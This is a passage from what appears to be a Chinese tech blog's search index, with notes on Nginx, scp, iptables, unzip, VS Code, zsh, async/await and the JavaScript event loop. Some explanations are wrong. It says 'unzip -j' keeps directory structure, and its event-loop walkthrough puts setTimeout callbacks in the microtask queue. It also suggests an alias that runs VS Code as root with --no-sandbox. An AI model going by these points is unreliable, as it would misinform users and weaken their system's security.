class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo yum install nginx</span><br></pre></td></tr></tbody></table></figure>\n\n<p>启动 Nginx 服务：</p>\n<p>使用以下命令启动 Nginx 服务：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl start nginx</span><br></pre></td></tr></tbody></table></figure>\n\n<p>检查 Nginx 状态：</p>\n<p>使用以下命令检查 Nginx 服务的状态：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl status nginx</span><br></pre></td></tr></tbody></table></figure>\n\n<p>如果 Nginx 正在运行，您将看到”active (running)” 状态。</p>\n<p>添加到开机启动项：</p>\n<p>要使 Nginx 在系统启动时自动启动，可以使用以下命令将其添加到开机启动项：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl enable nginx</span><br></pre></td></tr></tbody></table></figure>\n\n<p>现在，Nginx 将在系统启动时自动启动。您可以通过重新启动服务器并检查 Nginx 状态来验证设置是否成功。请注意，上述命令假定您具有适当的权限（如 sudo）来执行这些操作。</p>\n","categories":["linux","nginx"],"tags":["nginx","linux"]},{"title":"Scp 复制文件到服务器","url":"//linux/use/scp.html","content":"<h4 id=\"复制文件夹到服务器\"><a href=\"#复制文件夹到服务器\" class=\"headerlink\" title=\"复制文件夹到服务器\"></a>复制文件夹到服务器</h4><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">scp -r key root@4*.1*8.1*0.70:/etc/nginx/conf.d/cert</span><br></pre></td></tr></tbody></table></figure>\n","categories":["linux","scp"],"tags":["linux","scp"]},{"title":"腾讯云服务器开发端口","url":"//linux/port/open.html","content":"<ol>\n<li><p>了解端口<br>在开始之前，我们需要了解一下端口。端口是计算机网络中的一个概念，它是用于标识应用程序的逻辑地址。在互联网中，每个应用程序都需要使用一个端口来进行通信。常见的端口有 HTTP 端口（80）、FTP 端口（21）、SSH 端口（22）等等。</p>\n</li>\n<li><p>登录腾讯云服务器<br>首先，我们需要登录到腾讯云服务器。可以使用 SSH 工具，如 PuTTY 或 Xshell，连接到服务器。在连接成功后，输入用户名和密码即可登录到服务器。</p>\n</li>\n<li><p>开放端口<br>要开放端口，我们需要使用防火墙规则。腾讯云服务器默认使用的是 iptables 防火墙。我们可以使用以下命令来开放端口：</p>\n</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">iptables -I INPUT -p tcp --dport 端口号 -j ACCEPT</span><br></pre></td></tr></tbody></table></figure>\n\n<p>其中，端口号是需要开放的端口号。例如，如果要开放 SSH 端口（22），则可以使用以下命令：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">iptables -I INPUT -p tcp --dport 22 -j ACCEPT</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"4\">\n<li>保存规则<br>开放端口后，我们需要保存规则，以便在服务器重启后仍然有效。可以使用以下命令来保存规则：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">service iptables save</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"5\">\n<li>查看规则<br>如果想要查看当前的防火墙规则，可以使用以下命令：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">iptables -L</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这将列出当前的防火墙规则，包括已开放的端口。</p>\n<p>总结<br>开放端口是使用腾讯云服务器的一个基本操作。通过了解端口、登录服务器、开放端口、保存规则和查看规则，我们可以轻松地开放需要的端口，以便应用程序可以正常运行。</p>\n","categories":["linux"],"tags":["linux"]},{"title":"Ubuntu 解压 Zip 文件命令详解","url":"//linux/use/zip.html","content":"<h3 id=\"基本介绍\"><a href=\"#基本介绍\" class=\"headerlink\" title=\"基本介绍\"></a>基本介绍</h3><p>Ubuntu 解压 Zip 文件的命令是 “unzip”，它可以解压几乎所有的 Zip 文件。其基本的语法为：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">unzip [option] filename.zip</span><br></pre></td></tr></tbody></table></figure>\n\n<p>其中，filename.zip 表示要解压的 Zip 文件名，option 参数是可选的，用来控制解压的行为，常用的 option 参数如下：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">-d：指定解压到的目录，例如：unzip -d /home/user/untitled filename.zip，即将filename.zip解压到/home/user/untitled目录；</span><br><span class=\"line\">-q：不显示详细信息，即不显示每个文件的解压进度信息；</span><br><span class=\"line\">-o：覆盖目标文件，即如果目标文件存在就覆盖它；</span><br><span class=\"line\">-P：指定Zip文件的密码。</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"解压Zip文件到当前路径\"><a href=\"#解压Zip文件到当前路径\" class=\"headerlink\" title=\"解压Zip文件到当前路径\"></a>解压 Zip 文件到当前路径</h3><p>解压一个 Zip 文件到当前路径很简单，只要在终端中输入 “unzip filename.zip” 即可。比如：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">unzip archive.zip</span><br></pre></td></tr></tbody></table></figure>\n\n<p>上述命令将会将 “archive.zip” 文件解压到当前路径中。如果你希望将 Zip 文件解压到另外一个路径，可以使用 “-d” 参数，如下所示：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">unzip archive.zip -d /home/user/some_folder</span><br></pre></td></tr></tbody></table></figure>\n\n<p>上述命令将会将 “archive.zip” 文件解压到 “/home/user/some_folder” 路径中。</p>\n<h3 id=\"解压指定的文件\"><a href=\"#解压指定的文件\" class=\"headerlink\" title=\"解压指定的文件\"></a>解压指定的文件</h3><p>有时候我们只需要解压 Zip 文件中的某些文件，而不是全部文件，这时候可以使用 “unzip -j” 命令。</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">unzip -j archive.zip file.txt</span><br></pre></td></tr></tbody></table></figure>\n\n<p>上述命令将会将 “archive.zip” 文件中的 “file.txt” 文件解压到当前路径中。</p>\n<h3 id=\"解压时覆盖已存在的文件\"><a href=\"#解压时覆盖已存在的文件\" class=\"headerlink\" title=\"解压时覆盖已存在的文件\"></a>解压时覆盖已存在的文件</h3><p>默认情况下，如果解压的目标文件已经存在，unzip 命令会提示是否覆盖。如果你希望不进行提示，强制覆盖已经存在的文件，可以使用 “-o” 参数。</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">unzip -o archive.zip</span><br></pre></td></tr></tbody></table></figure>\n\n<p>上述命令将会解压 “archive.zip” 文件到当前路径中，如果有重名的文件会强制覆盖。</p>\n<h3 id=\"解压时保留目录结构\"><a href=\"#解压时保留目录结构\" class=\"headerlink\" title=\"解压时保留目录结构\"></a>解压时保留目录结构</h3><p>默认情况下，unzip 命令会将 Zip 文件中的所有文件解压到当前路径中，不管其原来所在的目录结构。如果你希望保留原来的目录结构，可以使用 “unzip -j” 命令，如下所示：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">unzip archive.zip -d /home/user/some_folder</span><br></pre></td></tr></tbody></table></figure>\n\n<p>上述命令将会将 “archive.zip” 文件解压到 “/home/user/some_folder” 路径中，并保留原来的目录结构。</p>\n<h3 id=\"解压时指定密码\"><a href=\"#解压时指定密码\" class=\"headerlink\" title=\"解压时指定密码\"></a>解压时指定密码</h3><p>如果 Zip 文件设置了密码，那么我们需要在解压时指定密码。</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">unzip -P secretPassword archive.zip</span><br></pre></td></tr></tbody></table></figure>\n<p>上述命令将会解压 “archive.zip” 文件，并使用 “secretPassword” 作为密码。</p>\n","categories":["linux","zip"],"tags":["linux","zip"]},{"title":"vscode . open project","url":"//linux/use/vscode/open/project.html","content":"<p>You are trying to start Visual Studio Code as a super user which isn’t recommended. If this was i…</p>\n<p>在 centos7 中通过 wget 安装 vscode (tar.gz 格式) 后，执行 /bin/code 出现提示：</p>\n<p>You are trying to start Visual Studio Code as a super user which isn’t recommended. If this was intended, please add the argument –no-sandbox and specify an alternate user data directory using the –user-data-dir argument.<br>您正试图以超级用户身份启动 Visual Studio 代码，这是不推荐的。如果是这样，请添加参数 “–no sandbox”，并使用 “–user data dir” 参数指定备用用户数据目录。</p>\n<p>解决方法：<br>方法一：修改～/.bashrc</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">vi ~/.bashrc</span><br></pre></td></tr></tbody></table></figure>\n\n<p>添加一行</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">whereis code </span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">code: /usr/bin/code /usr/share/code</span></span><br><span class=\"line\">alias code='/usr/share/code/code . --no-sandbox --unity-launch'</span><br></pre></td></tr></tbody></table></figure>\n\n\n\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">source ~/.bashrc</span><br></pre></td></tr></tbody></table></figure>\n","categories":["linux","vscode"],"tags":["linux","vscode"]},{"title":"zsh install","url":"//linux/install/zsh.html","content":"<p>Manual Installation</p>\n<h3 id=\"Clone-The-Repository\"><a href=\"#Clone-The-Repository\" class=\"headerlink\" title=\"Clone The Repository\"></a>Clone The Repository</h3><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">git clone https://githubfast.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"Optionally-Backup-Your-Existing-zshrc-File\"><a href=\"#Optionally-Backup-Your-Existing-zshrc-File\" class=\"headerlink\" title=\"Optionally, Backup Your Existing ~/.zshrc File\"></a>Optionally, Backup Your Existing ~/.zshrc File</h3><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">cp ~/.zshrc ~/.zshrc.orig</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"Create-A-New-Zsh-Configuration-File\"><a href=\"#Create-A-New-Zsh-Configuration-File\" class=\"headerlink\" title=\"Create A New Zsh Configuration File\"></a>Create A New Zsh Configuration File</h3><p>You can create a new zsh config file by copying the template that we have included for you.</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"Change-Your-Default-Shell\"><a href=\"#Change-Your-Default-Shell\" class=\"headerlink\" title=\"Change Your Default Shell\"></a>Change Your Default Shell</h3><figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">which zsh</span><br><span class=\"line\">chsh -s $(which zsh)</span><br></pre></td></tr></tbody></table></figure>\n\n<p>You must log out from your user session and log back in to see this change.</p>\n","categories":["linux","zsh"],"tags":["linux","zsh"]},{"title":"async/await 的理解","url":"//javascript/async/await.html","content":"<h2 id=\"async-await-的理解\"><a href=\"#async-await-的理解\" class=\"headerlink\" title=\"async/await 的理解\"></a>async/await 的理解</h2><p>async/await 其实是 Generator 的语法糖，它能实现的效果都能用 then 链来实现，它是为优化 then 链而开发出来的。从字面上来看，async 是 “异步” 的简写，await 则为等待，所以很好理解 async 用于申明一个 function 是异步的，而 await 用于等待一个异步方法执行完成。当然语法上强制规定 await 只能出现在 asnyc 函数中，先来看看 async 函数返回了什么：</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">testAsy</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"string\">\"hello world;\"</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">let</span> result = <span class=\"title function_\">testAsy</span>();</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(result);</span><br><span class=\"line\"><span class=\"title class_\">Promise</span> {&lt;fulfilled&gt;: <span class=\"string\">'hello world;'</span>}</span><br><span class=\"line\">[[<span class=\"title class_\">Prototype</span>]]: <span class=\"title class_\">Promise</span></span><br><span class=\"line\">[[<span class=\"title class_\">PromiseState</span>]]: <span class=\"string\">\"fulfilled\"</span></span><br><span class=\"line\">[[<span class=\"title class_\">PromiseResult</span>]]: <span class=\"string\">\"hello world;\"</span></span><br></pre></td></tr></tbody></table></figure>\n<p>所以，async 函数返回的是一个 Promise 对象。async 函数（包含函数语句、函数表达式、Lambda 表达式）会返回一个 Promise 对象，如果在函数中 return 一个直接量，async 会把这个直接量通过 Promise.resolve () 封装成 Promise 对象。async 函数返回的是一个 Promise 对象，所以在最外层不能用 await 获取其返回值的情况下，当然应该用原来的方式：then () 链来处理这个 Promise 对象，就像这样：</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">testAsy</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"string\">\"hello world;\"</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">let</span> result = <span class=\"title function_\">testAsy</span>();</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(result);</span><br><span class=\"line\">result.<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> {</span><br><span class=\"line\">\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(res); <span class=\"comment\">// hello world;</span></span><br><span class=\"line\">})</span><br></pre></td></tr></tbody></table></figure>\n<p>那如果 async 函数没有返回值，又该如何？很容易想到，他会返回</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Promise</span>.<span class=\"title function_\">resolve</span>(<span class=\"literal\">undefined</span>);</span><br></pre></td></tr></tbody></table></figure>\n<p>联想一下 Promise 的特点 —— 无等待，所以在没有 await 的情况下执行 async 函数，它会立即执行，返回一个 Promise 对象，并且，绝不会阻塞后面的语句。这和普通返回 Promise 对象的函数并无二致。</p>\n<pre><code> 注意：Promise.resolve(x) 可以看作是new Promise(resolve=&gt;resolve(x)) 的简写\n 可以用于快速封装字面量对象或其他对象，将其封装成 Promise 实例。\n</code></pre>\n<h2 id=\"async-await-的优势\"><a href=\"#async-await-的优势\" class=\"headerlink\" title=\"async/await 的优势\"></a>async/await 的优势</h2><p>单一的 Promise 链并不能发现 async/await 的优势，但是，如果需要处理由多个 Promise 组成的 then 链的时候，优势就能体现出来了（很有意思，Promise 通过 then 链来解决多层回调的问题，现在又用 async/await 来进一步优化它）。<br>假设一个业务，分多个步骤完成，每个步骤都是异步的，而且依赖于上一个步骤的结果。仍然用 setTimeout 来模拟异步操作：</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">takeLongTime</span>(<span class=\"params\">n</span>) {</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(<span class=\"function\"><span class=\"params\">resolve</span> =&gt;</span> {</span><br><span class=\"line\">\t\t<span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> <span class=\"title function_\">resolve</span>(n + <span class=\"number\">200</span>), n)</span><br><span class=\"line\">\t})</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">step1</span>(<span class=\"params\">n</span>) {</span><br><span class=\"line\">\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`step1 with <span class=\"subst\">${n}</span>`</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_\">takeLongTime</span>(n);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">step2</span>(<span class=\"params\">n</span>) {</span><br><span class=\"line\">\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`step2 with <span class=\"subst\">${n}</span>`</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_\">takeLongTime</span>(n);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">step3</span>(<span class=\"params\">n</span>) {</span><br><span class=\"line\">\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`step3 with <span class=\"subst\">${n}</span>`</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_\">takeLongTime</span>(n);</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n<p>现在用 Promise 方式来实现这三个步骤的处理：</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">doIt</span>(<span class=\"params\">n</span>) {</span><br><span class=\"line\">\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">time</span>(<span class=\"string\">'doIt'</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> time1 = <span class=\"number\">300</span>;</span><br><span class=\"line\">\t<span class=\"title function_\">step1</span>(time1)</span><br><span class=\"line\">\t\t.<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">time2</span> =&gt;</span> <span class=\"title function_\">step2</span>(time2))</span><br><span class=\"line\">\t\t.<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">time3</span> =&gt;</span> <span class=\"title function_\">step3</span>(time3))</span><br><span class=\"line\">\t\t.<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">result</span> =&gt;</span> {</span><br><span class=\"line\">\t\t\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`result is <span class=\"subst\">${result}</span>`</span>);</span><br><span class=\"line\">\t\t\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">timeEnd</span>(<span class=\"string\">'doIt'</span>);</span><br><span class=\"line\">\t\t});\t</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">doIt</span>();</span><br><span class=\"line\">step1 <span class=\"keyword\">with</span> <span class=\"number\">300</span></span><br><span class=\"line\">step2 <span class=\"keyword\">with</span> <span class=\"number\">500</span></span><br><span class=\"line\">step3 <span class=\"keyword\">with</span> <span class=\"number\">700</span></span><br><span class=\"line\">result is <span class=\"number\">900</span></span><br><span class=\"line\"><span class=\"attr\">doIt</span>: <span class=\"number\">1.</span>652s</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p>输出结果 result 是 step3 () 的参数 700 + 200 = 900。doIt () 顺序执行了三个步骤，一共用了 300 + 500 + 700 = 1500 毫秒，和 console.time ()/console.timeEnd () 计算的结果一致。如果用 async/await 来实现呢，会是这样：</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">doIt</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">time</span>(<span class=\"string\">'doIt'</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> time1 = <span class=\"number\">300</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> time2 = <span class=\"keyword\">await</span> <span class=\"title function_\">step1</span>(time1);</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> time3 = <span class=\"keyword\">await</span> <span class=\"title function_\">step2</span>(time2);</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> result = <span class=\"keyword\">await</span> <span class=\"title function_\">step3</span>(time3);</span><br><span class=\"line\">\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`result is <span class=\"subst\">${result}</span>`</span>);</span><br><span class=\"line\">\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">timeEnd</span>(<span class=\"string\">'doIt'</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">doIt</span>();</span><br><span class=\"line\">step1 <span class=\"keyword\">with</span> <span class=\"number\">300</span></span><br><span class=\"line\">step2 <span class=\"keyword\">with</span> <span class=\"number\">500</span></span><br><span class=\"line\">step3 <span class=\"keyword\">with</span> <span class=\"number\">700</span></span><br><span class=\"line\">result is <span class=\"number\">900</span></span><br><span class=\"line\"><span class=\"attr\">doIt</span>: <span class=\"number\">1.</span>515s</span><br></pre></td></tr></tbody></table></figure>\n\n<p>结果和之前的 Promise 实现是一样的，但是这个代码看起来是不是清晰得多，几乎跟同步代码一样</p>\n<h2 id=\"async-await-对比-Promise-的优势\"><a href=\"#async-await-对比-Promise-的优势\" class=\"headerlink\" title=\"async/await 对比 Promise 的优势\"></a>async/await 对比 Promise 的优势</h2><p>代码读起来更加同步，Promise 虽然摆脱了回调地狱，但是 then 的链式调⽤也会带来额外的阅读负担</p>\n<p>Promise 传递中间值⾮常麻烦，⽽ async/await ⼏乎是同步的写法，⾮常优雅</p>\n<p>错误处理友好，async/await 可以⽤成熟的 try/catch，Promise 的错误捕获⾮常冗余</p>\n<p>调试友好，Promise 的调试很差，由于没有代码块，你不能在⼀个返回表达式的箭头函数中设置断点，如果你在⼀个.then 代码块中使⽤调试器的步进 (step-over) 功能，调试器并不会进⼊后续的.then 代码块，因为调试器只能跟踪同步代码的每⼀步。</p>\n","categories":["前端","es6"],"tags":["前端","JavaScript","es6"]},{"title":"事件循环（Event Loop）","url":"//javascript/eventloop.html","content":"<p>事件循环（Event Loop）是计算机程序中的一个设计模式，用于处理异步操作，特别是在图形用户界面程序和服务器端应用程序中。事件循环模式通过等待并分派事件或回调函数来驱动程序的执行流程，而不是通过直接执行代码的方式。</p>\n<p>在编程领域，事件循环通常余非阻塞 I/O 和异步编程模型结合使用。这种模式允许程序在等待一个长时间操作（如网络请求或磁盘 I/O）完成时继续处理其他任务。一旦长时间操作完成，相关的回调函数就会被放入事件循环中等待执行。</p>\n<p>事件循环的基本工作原理如下：</p>\n<ol>\n<li>事件循环开始时，它首先检查是否有任何事件或回调函数需要执行。</li>\n<li>如果没有事件或回调函数需要执行，事件循环将进入休眠状态，等待新事件或回调函数的到来。</li>\n<li>当有事件或回调函数需要执行时，事件循环从等待队列中取出事件或回调函数，并将其放入执行队列中。</li>\n<li>事件循环从执行队列中取出事件或回调函数，并执行它们。</li>\n<li>执行完成后，事件循环将事件或回调函数从执行队列中移除，并继续等待新的事件或回调函数。</li>\n</ol>\n<p>在 JavaScript 中，事件循环通常由 JavaScript 引擎和宿主环境（如浏览器或 Node.js）共同实现。JavaScript 引擎负责执行代码，而宿主环境负责管理事件和回调函数。</p>\n<p>如下代码：</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'1'</span>);</span><br><span class=\"line\"><span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'2'</span>);</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'3'</span>);</span><br><span class=\"line\">    }, <span class=\"number\">0</span>);</span><br><span class=\"line\">}, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'4'</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p>执行结果：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">1</span><br><span class=\"line\">4</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td></tr></tbody></table></figure>\n\n<p>执行过程：</p>\n<ol>\n<li>现将 <code>console.log('1');</code> 放入执行队列中，并立即执行。</li>\n<li>将 <code>setTimeout(() =&gt; { console.log('2'); setTimeout(() =&gt; { console.log('3'); }, 0); }, 0);</code> 放入宏任务队列中。</li>\n<li>将 <code>console.log('4');</code> 放入执行队列中，并立即执行。</li>\n<li>将 <code>() =&gt; { console.log('2'); setTimeout(() =&gt; { console.log('3'); }, 0); }</code> 放入微任务队列中；</li>\n<li>当执行队列执行完以后去，微任务队列中查看是否有需要执行代码的回调函数，发现 <code>() =&gt; { console.log('2'); setTimeout(() =&gt; { console.log('3'); }, 0); }</code>；</li>\n<li>将 <code>console.log('2');</code> 放入执行队列中，并立即执行。</li>\n<li>将 <code>setTimeout(() =&gt; { console.log('3'); }, 0);</code> 放入宏任务队列中；</li>\n<li>将 <code>() =&gt; { console.log('3'); }</code> 放入微任务队列中；</li>\n<li>当执行队列执行完以后去，微任务队列中查看是否有需要执行代码的回调函数，发现 <code>() =&gt; { console.log('3'); }</code>；</li>\n<li>将 <code>console.log('3');</code> 放入执行队列中，并立即执行。</li>\n</ol>\n<p>微任务（Microtask）和宏任务（Macrotask）是 JavaScript 中事件循环机制的两个重要概念，它们决定了异步代码的执行时机和顺序。以下是微任务和宏任务的主要区别以及它们各自包含的任务类型：</p>\n<h3 id=\"微任务（Microtask）\"><a href=\"#微任务（Microtask）\" class=\"headerlink\" title=\"微任务（Microtask）\"></a>微任务（Microtask）</h3><ol>\n<li><p><strong>定义</strong>：<br>微任务是一类非常小的任务，它们通常与当前执行栈中的代码有关，并且总是在当前执行栈清空后立即执行。</p>\n</li>\n<li><p><strong>特点</strong>：</p>\n<ul>\n<li>微任务具有高优先级，它们总是在宏任务之前执行。</li>\n<li>微任务可以快速响应状态的变化，因为它们在每次事件循环迭代的末尾执行。</li>\n<li>微任务的执行不会阻塞后续代码的执行。</li>\n</ul>\n</li>\n<li><p><strong>包含的任务类型</strong>：</p>\n<ul>\n<li><code>Promise</code> 的<code>.then()</code> 回调函数。</li>\n<li><code>MutationObserver</code> 的回调函数。</li>\n<li>手动添加的微任务，例如使用 <code>queueMicrotask()</code> 函数。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"宏任务（Macrotask）\"><a href=\"#宏任务（Macrotask）\" class=\"headerlink\" title=\"宏任务（Macrotask）\"></a>宏任务（Macrotask）</h3><ol>\n<li><p><strong>定义</strong>：<br>宏任务是一类较大的任务，它们通常与用户交互或 I/O 操作有关，并且总是在微任务执行完毕后执行。</p>\n</li>\n<li><p><strong>特点</strong>：</p>\n<ul>\n<li>宏任务具有较低的优先级，它们总是在微任务之后执行。</li>\n<li>宏任务的执行可能会阻塞后续代码的执行，因为它们通常涉及到等待外部事件或资源。</li>\n<li>宏任务的执行次数通常比微任务多，因为每次事件循环迭代可能包含多个宏任务。</li>\n</ul>\n</li>\n<li><p><strong>包含的任务类型</strong>：</p>\n<ul>\n<li><code>setTimeout</code> 和 <code>setInterval</code> 的回调函数。</li>\n<li><code>requestAnimationFrame</code> 的回调函数。</li>\n<li><code>setImmediate</code>（在 Node.js 中可用）的回调函数。</li>\n<li>浏览器事件，如点击、滚动、键盘输入等。</li>\n<li>网络请求、文件读写等 I/O 操作完成后的回调函数。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"事件循环中的执行顺序\"><a href=\"#事件循环中的执行顺序\" class=\"headerlink\" title=\"事件循环中的执行顺序\"></a>事件循环中的执行顺序</h3><p>在 JavaScript 的事件循环中，微任务和宏任务按照以下顺序执行：</p>\n<ol>\n<li>执行当前执行栈中的所有同步代码。</li>\n<li>清空当前执行栈。</li>\n<li>执行所有微任务队列中的微任务。</li>\n<li>执行所有宏任务队列中的宏任务。</li>\n<li>重复步骤 1-4，直到微任务和宏任务队列都为空。</li>\n</ol>\n<p>这种机制确保了 JavaScript 能够以非阻塞的方式处理异步事件，同时保证了高优先级任务（如用户交互和状态变化）能够及时响应。开发者可以利用微任务和宏任务的特性来优化代码性能和用户体验。</p>\n<p>下面实例代码包括微任务和宏任务：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 1. 同步代码执行</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'1'</span>);</span><br><span class=\"line\"><span class=\"comment\">// 3. 宏任务执行</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> timeoutId = <span class=\"built_in\">setTimeout</span>(</span><br><span class=\"line\">    <span class=\"comment\">// 4. 微任务执行</span></span><br><span class=\"line\">    <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'2'</span>);</span><br><span class=\"line\">        <span class=\"built_in\">clearTimeout</span>(timeoutId);</span><br><span class=\"line\">    }, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">// 3. 宏任务执行</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> intervalId = <span class=\"built_in\">setInterval</span>(</span><br><span class=\"line\">    <span class=\"comment\">// 4. 微任务执行</span></span><br><span class=\"line\">    <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">        <span 